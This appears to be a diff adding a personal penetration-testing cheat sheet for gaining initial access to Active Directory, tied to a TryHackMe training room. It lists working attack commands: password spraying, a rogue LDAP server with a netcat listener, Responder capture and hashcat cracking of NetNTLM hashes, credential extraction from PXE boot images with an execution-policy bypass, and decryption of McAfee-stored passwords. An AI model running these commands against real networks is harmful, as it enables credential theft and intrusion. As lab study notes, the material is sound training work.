@@ -1,0 +1,69 @@
+### Active Directory / Get first access ###
+## links ##
+https://tryhackme.com/room/breachingad
+
+
+#################
+## brute force ##
+#################
+# use password spraying because bf on 1 account will lock it
+python ~/perso/secu/win/AD/ntlm_passwordspray.py -u users.txt -f za.thm.com -p pass -a http://ntlmauth.za.thm.com
+
+
+#######################################
+## LDAP pass-back, rogue LDAP server ##
+#######################################
+nc -lvp 389
+sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
+sudo dpkg-reconfigure -p low slapd
+	> No, DNS:za.tryhackme.com, Org:za.tryhackme.com, slappasswd -h {SSHA}, MDB, No,yes.
+https://tryhackme.com/room/breachingad
+
+
+############################
+## MITM NetNTLM Challenge ##
+############################
+# link: https://github.com/lgandx/Responder
+# on same network
+sudo responder -I tun0
+hashcat -m 5600 <hash file> <password file>
+
+
+####################
+## PXE Boot Image ##
+####################
+# from an already pwn machine
+> tftp -i IP GET "\Tmp\x64{39...28}.bcd" conf.bcd
+> powershell -executionpolicy bypass
+PS> Import-Module .\PowerPXE.ps1
+PS> $BCDFile = "conf.bcd"
+PS> Get-WimFile -bcdFile $BCDFile
+PS> tftp -i IP GET "<PXE Boot Image Location>" pxeboot.wim			# wait it will take some times
+PS> Get-FindCredentials -WimFile pxeboot.wim					# find userID userPassword
+
+
+########################
+## McAfee Config File ##
+########################
+# from an already pwn machine
+> cd "C:\ProgramData\McAfee\Agent\DB"
+> scp user@IP:C:/ProgramData/McAfee/Agent/DB/ma.db .
+sqlite3 ma.db									# search in table for encrypted pass
+python2 /home/tristan/perso/secu/win/AD/mcafee_sitelist_pwd_decrypt.py "hash"	# carefull old script
+
+
+#################
+## change pass ##
+#################
+Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
+
+
+################
+## GPO update ##
+################
+C:\Windows\SYSVOL\sysvol\							# mapped in a share
+PS C:\> gpupdate /force								# to force update
+PS C:\> gpresult /H outfile.html						# gen a HTML file with settings
+
+
+
